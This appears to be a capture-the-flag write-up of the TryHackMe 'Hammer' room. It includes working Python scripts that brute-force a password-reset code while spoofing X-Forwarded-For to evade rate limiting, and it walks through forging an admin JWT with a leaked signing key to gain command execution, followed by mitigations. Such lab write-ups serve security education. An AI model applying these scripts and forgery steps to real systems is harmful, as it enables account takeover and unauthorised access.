---

title: TryHackMe Hammer Writeup
tags: [enumeration, brute-force, authentication, web]
difficulty: intermediate
platform: tryhackme

---

# TryHackMe Hammer Writeup

## Table Of Contents
<details>
<summary>Show</summary>

- [TryHackMe Hammer Writeup](#tryhackme-hammer-writeup)
  - [Table Of Contents](#table-of-contents)
  - [Room Link](#room-link)
  - [Key Skills Demonstrated](#key-skills-demonstrated)
  - [Tools Used](#tools-used)
  - [Summary](#summary)
  - [Enumeration](#enumeration)
    - [Nmap Scan](#nmap-scan)
    - [HTTP Enumeration](#http-enumeration)
    - [Screenshots](#screenshots)
      - [Login Form](#login-form)
      - [Developer Comment](#developer-comment)
      - [fuff Output](#fuff-output)
      - [Discovered Log file](#discovered-log-file)
      - [Log File Content](#log-file-content)
  - [Exploitation](#exploitation)
    - [Flag 1: Gaining User Access](#flag-1-gaining-user-access)
      - [Password Reset Enumeration](#password-reset-enumeration)
      - [Bypassing Rate Limiting](#bypassing-rate-limiting)
      - [Brute-Forcing Recovery Code](#brute-forcing-recovery-code)
      - [Script Flow](#script-flow)
      - [Detailed Script Flow](#detailed-script-flow)
        - [`main()` method](#main-method)
        - [`enumerate_codes()` method](#enumerate_codes-method)
        - [`send_password_reset_request()` method](#send_password_reset_request-method)
      - [Script Execution](#script-execution)
      - [Resetting Password (manual method using Burp Suite)](#resetting-password-manual-method-using-burp-suite)
      - [Resetting Password (automated method using Python script)](#resetting-password-automated-method-using-python-script)
      - [Modified Script Execution](#modified-script-execution)
      - [Using New Password to Login](#using-new-password-to-login)
      - [Screenshots](#screenshots-1)
        - [Reset Password Form](#reset-password-form)
        - [Reset Password Form Timer](#reset-password-form-timer)
        - [Rate Limiting Response Header](#rate-limiting-response-header)
        - [Rate Limit Exceeded](#rate-limit-exceeded)
        - [X-Forwarded-For Header](#x-forwarded-for-header)
        - [X-Forwarded-For Header with another IP](#x-forwarded-for-header-with-another-ip)
        - [Burp Suite Intercept Reset Password Request](#burp-suite-intercept-reset-password-request)
        - [Burp Suite Add Session Cookie](#burp-suite-add-session-cookie)
        - [Enter New Password](#enter-new-password)
        - [Logging in with New Password](#logging-in-with-new-password)
        - [1st Flag](#1st-flag)
    - [Flag 2: Escalating to Admin](#flag-2-escalating-to-admin)
      - [Extending Cookie Lifetime to Prevent Auto-Logout](#extending-cookie-lifetime-to-prevent-auto-logout)
      - [Fuzzing Commands](#fuzzing-commands)
      - [Discovery of JWT Signing Key](#discovery-of-jwt-signing-key)
        - [Supporting Evidence from JWT Header](#supporting-evidence-from-jwt-header)
        - [Testing the Hypothesis](#testing-the-hypothesis)
        - [JWT Forgery](#jwt-forgery)
      - [Forging an Admin JWT to get RCE](#forging-an-admin-jwt-to-get-rce)
      - [Screenshots](#screenshots-2)
        - [persistentSession Cookie](#persistentsession-cookie)
        - [Dashboard Logout Script](#dashboard-logout-script)
        - [Update Max-Age](#update-max-age)
        - [Dashboard Form](#dashboard-form)
        - [Dashboard Form](#dashboard-form-1)
        - [Execute Command](#execute-command)
        - [Save Execute Command Request](#save-execute-command-request)
        - [Fuzz Command Parameter](#fuzz-command-parameter)
        - [List of Files](#list-of-files)
        - [Decoded JWT](#decoded-jwt)
        - [CURL Key File](#curl-key-file)
        - [Forge Token Kid Value](#forge-token-kid-value)
        - [Forge Token Signing](#forge-token-signing)
        - [Forge Admin Token Role Claim](#forge-admin-token-role-claim)
        - [Forge Admin Token Kid Value and Signing](#forge-admin-token-kid-value-and-signing)
        - [Update Set-Cookie Header with Forged JWT](#update-set-cookie-header-with-forged-jwt)
        - [Add Forged JWT to Execute Command Req](#add-forged-jwt-to-execute-command-req)
        - [Fuff Forged Admin Token Output](#fuff-forged-admin-token-output)
        - [Cat Command with Admin Token](#cat-command-with-admin-token)
        - [2nd Flag](#2nd-flag)
  - [Outcome](#outcome)
  - [Mitigation](#mitigation)
  - [Attack Flow Diagram](#attack-flow-diagram)
  
</details>  

## Room Link
https://tryhackme.com/room/hammer

---

## Key Skills Demonstrated
- Web application enumeration using `ffuf`
- Bypassing rate limiting via `X-Forwarded-For` header manipulation
- Password reset token brute-forcing and session management
- JWT tampering for privilege escalation
- Manual identification of insecure development practices

---

## Tools Used
- Nmap
- FFUF
- Burp Suite
- Custom Python script
- Crunch wordlist generator

---

## Summary
Hammer involves exploiting a poorly configured web application to achieve remote code execution (RCE). The challenge begins with discovering a log file through directory fuzzing, leading to the disclosure of a valid email address. This email enables a password reset, which can be brute-forced by bypassing rate limiting using HTTP headers. Upon account access, privilege escalation is performed through manipulation of JWTs to gain administrative access.

---

## Enumeration

### Nmap Scan
```
nmap -T4 -n -sC -sV -Pn -p- [target_ip]
```
Two open ports discovered.

<img src="./images/nmap-scan.png" alt="" width="100%"/> 

| Port      | Service   | Version |
| ----      | -------   | ------- |
| 22/tcp    | SSH       | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) |
| 1337/tcp  | HTTP      | Apache httpd 2.4.41 ((Ubuntu)) |

### HTTP Enumeration
- `http://[target_ip]:1337` displayed a login form with an email/password field and a password reset link ([See screenshot](#login-form)).
- A developer comment in the HTML hinted at a directory naming convention: `hmr_DIRECTORY_NAME` ([See screenshot](#developer-comment)).  
- Used `ffuf` to fuzz directories with a SecList from: https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/raft-medium-directories.txt ([See screenshot](#fuff-output)).  
```
ffuf -u 'http://[target_ip]:1337/hmr_FUZZ' -w raft-medium-directories.txt -mc 200,301
```
- Navigated to `/hmr_logs` and discovered an `error.logs` file ([See screenshot](#discovered-log-file)).
- Opened `errors.logs` and found reference to a `tester@hammer.thm` email address ([See screenshot](#log-file-content)).

### Screenshots

#### Login Form
<details>
<summary>Show</summary>
<img src="./images/login-form.png" alt="" width="100%"/> 
</details>

#### Developer Comment
<details>
<summary>Show</summary>
<img src="./images/directrory-naming-convention.png" alt="" width="100%"/> 
</details>

#### fuff Output
<details>
<summary>Show</summary>
<img src="./images/fuff-directories.png" alt="" width="100%"/> 
</details>

#### Discovered Log file
<details>
<summary>Show</summary>
<img src="./images/hmr-logs.png" alt="" width="100%"/> 
</details>

#### Log File Content
<details>
<summary>Show</summary>
<img src="./images/error-logs-file.png" alt="" width="100%"/> 
</details>

---

## Exploitation

### Flag 1: Gaining User Access

#### Password Reset Enumeration

- Used the valid email to trigger a reset at `/reset_password.php` ([See screenshot](#reset-password-form)).
- Reset page enforces 4-digit recovery code entry with 180 second timer ([See screenshot](#reset-password-form-timer)).
- Used BURP Suite to intercept a POST request to `/reset_password.php` and found rate limiting is being enforced ([See screenshot](#rate-limiting-response-header)).
- Continued POST requests until a ‘Rate limit exceeded’ message appeared ([See screenshot](#rate-limit-exceeded)).

#### Bypassing Rate Limiting

- Added `X-Forwarded-For` Request header with an IP address to reset the `Rate-Limit-Pending` counter ([See screenshot](#x-forwarded-for-header)).
- Changed the IP address to ensure the counter resets on each request ([See screenshot](#x-forwarded-for-header-with-another-ip)).

#### Brute-Forcing Recovery Code

Wrote Python script to brute-force recovery code.  
>Threading was used to accelerate the brute-force process due to a 180-second time constraint imposed by the server. By default, the script spawns 50 threads, allowing approximately 3,000 codes to be tested within the time window — a significant improvement over single-threaded execution. The thread count can be overridden via a command-line argument, though increasing it may lead to timeout errors depending on system/network conditions.

```python
#!/usr/bin/env python3

import sys
import threading
import requests

url = 'http://hammer.thm:1337/reset_password.php' 
email = "tester@hammer.thm"
stop_flag = threading.Event()
thread_count = 50
session = requests.Session()
invalid_code_message = "Invalid or expired recovery code!"

def send_password_reset_request():
    try:   
        response = session.post(url, data={"email": email})

        if response.status_code != 200:
            print(f"Request failed, status code: {response.status_code}")
            print("Response:")
            print(response.text)
            sys.exit()
        
    except Exception as e:
        print(f"Request failed, exception: {e}")
        sys.exit()

    return

def enumerate_codes(codes):
    for code in codes:
        code_string = code
        try:               
            response = session.post(
                url, 
                headers={
                    'X-Forwarded-For': code
                } , 
                data={
                    'recovery_code': code,
                    's': 180
                },
                allow_redirects=False   
            )

            if stop_flag.is_set():
                return
            elif response.status_code == 302:
                stop_flag.set()
                print("Timeout reached. Try again.")
                return
            else:
                if invalid_code_message not in response.text:
                    stop_flag.set()
                    print(f"Recovery code found: {code_string}")                      
                    print(f"Password can now be reset using the session cookie: {response.request.headers["cookie"]}")
                    
                    return

        except Exception as e:
            print(e)
            pass
        
def main(): 
    global thread_count
    global session 
    
    if len(sys.argv) > 1:
        thread_count = int(sys.argv[1])

    print("Sending password reset request..")     
    send_password_reset_request()

    print(f"Brute-forcing recovery code..")
    code_range = 10000  
    threads = []
    thread_step = code_range // thread_count #Number of codes per thread 
     
    for i in range(thread_count):
        start = i * thread_step
        end = start + thread_step
       
        codes_thread_subset = range(start, end)
        codes_thread_subset = [f"{code:04d}" for code in codes_thread_subset]
             
        thread = threading.Thread(target=enumerate_codes, args=([codes_thread_subset]))
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        thread.join()
        
        
if __name__ == "__main__":
    main()
```

#### Script Flow

1. Send a password reset request to initialize the flow for the target email.
2. Brute-force the 4-digit recovery code using multithreading.
3. Bypass rate limiting using a spoofed X-Forwarded-For header.
4. When correct recovery code is found extract session cookie to proceed with password reset.

#### Detailed Script Flow

<details>
<summary>Show</summary>

##### `main()` method
- Accept an optional CLI argument to adjust the number of threads (default is 50).
- Send the initial reset request to begin the reset process.
- Divide the 4-digit codes (0000–9999) evenly among threads.
- Launch each thread to run `enumerate_codes()` in parallel.
- Wait for all threads to complete.

##### `enumerate_codes()` method
- Iterate over a subset of codes assigned to the thread.
- For each code:
  - Set `X-Forwarded-For` to the same value as code (to bypass rate limiting).
  - Send a POST request with the code.
  - Check for expired session via a 302 redirect in response, if detected exit script.
  - Check for `Invalid or expired recovery code!` in response.
    - If not detected correct recovery code was found, print code and associated session cookie

##### `send_password_reset_request()` method
- Send a password reset request with the known email address to initiate recovery flow.
- If non-200 status code returned in response exit with an error.

</details>  

#### Script Execution 

```
python3 brute-force-recovery-code.py
```
<img src="./images/brute-force-script.png" alt="" width="100%"/> 

#### Resetting Password (manual method using Burp Suite)

- Intercepted a GET request to `/reset_password.php` in Burp Suite ([See screenshot](#burp-suite-intercept-reset-password-request)). 
- Replaced session cookie with session cookie returned by Python script ([See screenshot](#burp-suite-add-session-cookie)).
- Forwarded request
- Entered a new password in the displayed form ([See screenshot](#enter-new-password)).

#### Resetting Password (automated method using Python script)

Added a `reset_password()` method that sends a POST request with a new password after successful brute-forcing of recovery code.

```python
#!/usr/bin/env python3

import sys
import threading
import requests

url = 'http://hammer.thm:1337/reset_password.php' 
email = "tester@hammer.thm"
stop_flag = threading.Event()
thread_count = 50
session = requests.Session()
invalid_code_message = "Invalid or expired recovery code!"

def reset_password():
    new_password = "password123"

    session.post(
        url,
        data={
            "new_password": new_password,
            "confirm_password": new_password,
        }
    )

    print(f"Password has been reset to {new_password}")
    return

def send_password_reset_request():
    try:   
        response = session.post(url, data={"email": email})

        if response.status_code != 200:
            print(f"Request failed, status code: {response.status_code}")
            print("Response:")
            print(response.text)
            sys.exit()
        
    except Exception as e:
        print(f"Request failed, exception: {e}")
        sys.exit()

    return

def enumerate_codes(codes):
    for code in codes:
        code_string = code
        try:               
            response = session.post(
                url, 
                headers={
                    'X-Forwarded-For': code
                } , 
                data={
                    'recovery_code': code,
                    's': 180
                },
                allow_redirects=False   
            )

            if stop_flag.is_set():
                return
            elif response.status_code == 302:
                stop_flag.set()
                print("Timeout reached. Try again.")
                return
            else:
                if invalid_code_message not in response.text:
                    stop_flag.set()
                    print(f"Recovery code found: {code_string}")                                   
                    print(f"Resetting password..")
                    reset_password()                  
                    return

        except Exception as e:
            print(e)
            pass
        
def main(): 
    global thread_count
    global session 
    
    if len(sys.argv) > 1:
        thread_count = int(sys.argv[1])

    print("Sending password reset request..")     
    send_password_reset_request()

    print(f"Brute-forcing recovery code..")
    code_range = 10000  
    threads = []
    thread_step = code_range // thread_count #Number of codes per thread 
     
    for i in range(thread_count):
        start = i * thread_step
        end = start + thread_step
       
        codes_thread_subset = range(start, end)
        codes_thread_subset = [f"{code:04d}" for code in codes_thread_subset]
             
        thread = threading.Thread(target=enumerate_codes, args=([codes_thread_subset]))
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        thread.join()
        
        
if __name__ == "__main__":
    main()
```

#### Modified Script Execution 

```
python3 brute-force-recovery-code.py
```

<img src="./images/modified-brute-force-script.png" alt="" width="100%"/> 

#### Using New Password to Login
- Logged in with new password ([See screenshot](#logging-in-with-new-password)).
- Captured first flag from dashboard ([See screenshot](#1st-flag)).


#### Screenshots

##### Reset Password Form
<details>
<summary>Show</summary>
<img src="./images/reset-password-form.png" alt="" width="100%"/> 
</details>

##### Reset Password Form Timer
<details>
<summary>Show</summary>
<img src="./images/reset-password-form-timer.png" alt="" width="100%"/> 
</details>

##### Rate Limiting Response Header
<details>
<summary>Show</summary>
<img src="./images/rate-limiting-response-header-burp.png" alt="" width="100%"/> 
</details>

##### Rate Limit Exceeded
<details>
<summary>Show</summary>
<img src="./images/rate-limit-exceeded.png" alt="" width="100%"/> 
</details>

##### X-Forwarded-For Header
<details>
<summary>Show</summary>
<img src="./images/x-forwarded-for-header.png" alt="" width="100%"/> 
</details>

##### X-Forwarded-For Header with another IP
<details>
<summary>Show</summary>
<img src="./images/x-forwarded-for-header-another-ip.png" alt="" width="100%"/> 
</details>

##### Burp Suite Intercept Reset Password Request
<details>
<summary>Show</summary>
<img src="./images/burp-intercept-reset-password.png" alt="" width="100%"/> 
</details>

##### Burp Suite Add Session Cookie
<details>
<summary>Show</summary>
<img src="./images/burp-intercept-reset-password-session-cookie.png" alt="" width="100%"/> 
</details>

##### Enter New Password
<details>
<summary>Show</summary>
<img src="./images/enter-new-password.png" alt="" width="100%"/> 
</details>

##### Logging in with New Password
<details>
<summary>Show</summary>
<img src="./images/login-with-new-password.png" alt="" width="100%"/> 
</details>

##### 1st Flag 
<details>
<summary>Show</summary>
<img src="./images/1st-flag-captured.png" alt="" width="100%"/> 
</details>


### Flag 2: Escalating to Admin 

#### Extending Cookie Lifetime to Prevent Auto-Logout

- Observed that after logging in a `persistentSession` cookie is being set with a very short lifetime of 20 seconds ([See screenshot](#persistentsession-cookie)). 
- JavaScript in the `/dashboard.php` response checks for this cookie, if not present the script redirects to `/logout.php` ([See screenshot](#dashboard-logout-script)).
- Intercepted request to `/dashboard.php` in Burp Suite and updated `Max-Age` attribute in the `Set-Cookie` header of response to extend the cookie's lifetime and prevent logout ([See screenshot](#update-max-age)).

#### Fuzzing Commands

- The `/dashboard.php` page displayed the text *Your role: user* along with a form containing a single Enter Command input field. ([See screenshot](#dashboard-form))
- When the Submit button is clicked, a JavaScript click event handler triggers an AJAX POST request to `/execute_command.php`, sending the command in JSON format along with a hardcoded JWT token for authentication (the JWT will become relevant later). ([See screenshot](#execute-command))
- After intercepting and modifying the `execute_command.php` request in Burp Suite, replaced the command parameter value with the placeholder FUZZ and saved the request to a file (execute_command.req). ([See screenshot](#save-execute-command-request))
- Used `ffuf` to fuzz the command parameter using a [wordlist](https://github.com/yzf750/custom-fuzzing/blob/master/linux-commands-merged.txt) of Linux commands to identify which were allowed by the backend.
- The `-fr` flag was used to filter out responses containing "Command not allowed", isolating successful or unexpected behavior.
```
ffuf -request execute_command.req -request-proto http -w linux-commands-merged.txt -fr 'Command not allowed'
```
- Output from `ffuf` indicated that only the `ls` command was accepted by the server. All other tested commands resulted in the response "Command not allowed", which was used as a filter string via the `-fr` flag. ([See screenshot](#fuzz-command-parameter))

#### Discovery of JWT Signing Key
- Submitted the `ls` command via the dashboard interface and received a list of files from the Apache web root (`/var/www/html`). ([See screenshot](#list-of-files))
- Among standard application files (`index.php`, `config.php`, `reset_password.php`), a file named `188ade1.key` stood out due to its uncommon `.key` extension — suggesting it might be a cryptographic key (e.g., HMAC secret, SSH key).
- Given the application used JWTs for authentication — as seen in requests to `/execute_command.php` — it was suspected that the `.key` file may be related to JWT signature validation and was prioritised for investigation.

##### Supporting Evidence from JWT Header
- After capturing and decoding the JWT issued post-login ([See screenshot](#decoded-jwt)), the header revealed the following:
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```
- `"alg": "HS256"` specifies HMAC with SHA-256 as the signing algorithm, where a single shared symmetric key is used for both generating and verifying the JWT signature.
- The `"kid"` (Key ID) field suggests the server loads the JWT signing key from a file at `/var/www/mykey.key`.
- While the `kid` pointed to `mykey.key`, the `ls` output revealed a similarly purposed file, `188ade1.key`, located in `/var/www/html/`.
- This strongly implied that the server may be using `188ade1.key` instead, especially if `kid` can be manipulated by a client-supplied JWT header.

##### Testing the Hypothesis
- Fetched the suspected key file over HTTP using `curl`, since it was located in the exposed web root:
```
curl -s 'http://hammer.thm:1337/188ade1.key'
``` 
- This returned a 32-character hexadecimal string: `56058354efb3daa97ebab00fabd7a7d7`. ([See screenshot](#curl-key-file))
- This format is consistent with a key used for `HMAC` signing and matched expectations for an `HS256` JWT key (used for both signing and signature verification).

##### JWT Forgery

- Used [jwt.io](https://jwt.io/) to forge a new JWT:
  - The JWT header's `kid` value was changed to point to the key's true location: `/var/www/html/188ade1.key`. ([See screenshot](#forge-token-kid-value))
  - The token was re-signed using the extracted key value. ([See screenshot](#forge-token-signing))
- Intercepted the `/dashboard.php` response and added the forged JWT to the `Set-Cookie` response header. ([See screenshot](#update-set-cookie-header-with-forged-jwt))
- The forged token was accepted by the server - confirming the server uses the supplied `kid` path for signature validation.

#### Forging an Admin JWT to get RCE
- Following the above successful JWT forgery, a new admin token was forged: 
  - Changed the `role` claim from `user` to `admin`. ([See screenshot](#forge-admin-token-role-claim))
  - Set the JWT header’s `kid` to /var/www/html/188ade1.key and re-signed the token.([See screenshot](#forge-admin-token-kid-value-and-signing))
- Repeated the process of injecting the forged admin token into the `Set-Cookie` header. ([See screenshot](#update-set-cookie-header-with-forged-jwt))
- The server accepted the token, granting admin-level access.
- Updated `execute_command.req` to use the admin token. ([See screenshot](#add-forged-jwt-to-execute-command-req ))
- Used `ffuf` to fuzz the command parameter again using the updated request.
- This time, `ffuf` output indicated many more commands were accepted - confirming privilege escalation. ([See screenshot](#fuff-forged-admin-token-output))
- Submitted the `cat /home/ubuntu/flag.txt` command (as per the room challenge) via dashboard interface with the new admin token ([See screenshot](#cat-command-with-admin-token))
- Received the second flag to complete the CTF. ([See screenshot](#2nd-flag))

#### Screenshots

##### persistentSession Cookie
<details>
<summary>Show</summary>
<img src="./images/persistent-session-cookie-short-expiry.png" alt="" width="100%"/> 
</details>

##### Dashboard Logout Script 
<details>
<summary>Show</summary>
<img src="./images/dashboard-logout-script.png" alt="" width="100%"/> 
</details>

##### Update Max-Age 
<details>
<summary>Show</summary>
<img src="./images/update-maxage.png" alt="" width="100%"/> 
</details>

##### Dashboard Form 
<details>
<summary>Show</summary>
<img src="./images/1st-flag-captured.png" alt="" width="100%"/> 
</details>

##### Dashboard Form 
<details>
<summary>Show</summary>
<img src="./images/1st-flag-captured.png" alt="" width="100%"/> 
</details>

##### Execute Command 
<details>
<summary>Show</summary>
<img src="./images/execute-command-ajax-request.png" alt="" width="100%"/> 
</details>

##### Save Execute Command Request 
<details>
<summary>Show</summary>
<img src="./images/burp-save-execute-command-request.png" alt="" width="100%"/> 
</details>

##### Fuzz Command Parameter 
<details>
<summary>Show</summary>
<img src="./images/ececute-command-fuff.png" alt="" width="100%"/> 
</details>

##### List of Files 
<details>
<summary>Show</summary>
<img src="./images/ls-file-list.png" alt="" width="100%"/> 
</details>

##### Decoded JWT 
<details>
<summary>Show</summary>
<img src="./images/decoded-jwt.png" alt="" width="100%"/> 
</details>

##### CURL Key File 
<details>
<summary>Show</summary>
<img src="./images/curl-key-file.png" alt="" width="100%"/> 
</details>

##### Forge Token Kid Value
<details>
<summary>Show</summary>
<img src="./images/forging-token-kid-value.png" alt="" width="100%"/> 
</details>

##### Forge Token Signing
<details>
<summary>Show</summary>
<img src="./images/forging-token-signing.png" alt="" width="100%"/> 
</details>

##### Forge Admin Token Role Claim
<details>
<summary>Show</summary>
<img src="./images/forging-admin-token-role-claim.png" alt="" width="100%"/> 
</details>

##### Forge Admin Token Kid Value and Signing
<details>
<summary>Show</summary>
<img src="./images/forging-admin-token-kid-and-signing.png" alt="" width="100%"/> 
</details>

##### Update Set-Cookie Header with Forged JWT 
<details>
<summary>Show</summary>
<img src="./images/update-set-cookie-with-forged-jwt.png" alt="" width="100%"/> 
</details>

##### Add Forged JWT to Execute Command Req
<details>
<summary>Show</summary>
<img src="./images/add-forged-jwt-to-execute-command-req.png" alt="" width="100%"/> 
</details>

##### Fuff Forged Admin Token Output
<details>
<summary>Show</summary>
<img src="./images/fuff-forged-token-output.png" alt="" width="100%"/> 
</details>

##### Cat Command with Admin Token 
<details>
<summary>Show</summary>
<img src="./images/cat-command.png" alt="" width="100%"/> 
</details>

##### 2nd Flag 
<details>
<summary>Show</summary>
<img src="./images/2nd-flag-captured.png" alt="" width="100%"/> 
</details>

---

## Outcome

- Discovered user email via verbose error logs
- Bypassed password reset rate limiting
- Forged JWTs for privilege escalation
- Achieved RCE and captured both flags

---

## Mitigation

- Return generic login/reset error messages
- Implement strict rate limiting (beyond X-Forwarded-For)
- Use strong JWT signing and validation (e.g., HMAC with server-side key)
- Disable verbose debug information and comments in production code

---

## Attack Flow Diagram

<details>
<summary>Show</summary>

[Start]  
   |  
[Directory Fuzzing with FFUF]  
   |  
[Log File Found: Email Leaked]  
   |  
[Password Reset Page Accessed]  
   |  
[Rate Limiting Detected]  
   |  
[X-Forwarded-For Bypass Implemented]  
   |  
[Brute-Force 4-digit Token]  
   |  
[User Login Achieved → Flag 1]  
   |  
[JWT Observed and Modified]  
   |  
[Privilege Escalation to Admin]  
   |  
[Command Execution Access → Flag 2]  

</details>

---

[⬅ Back to Write-Ups Home](../../../README.md)

> Educational use only. All activities conducted in legal TryHackMe environment.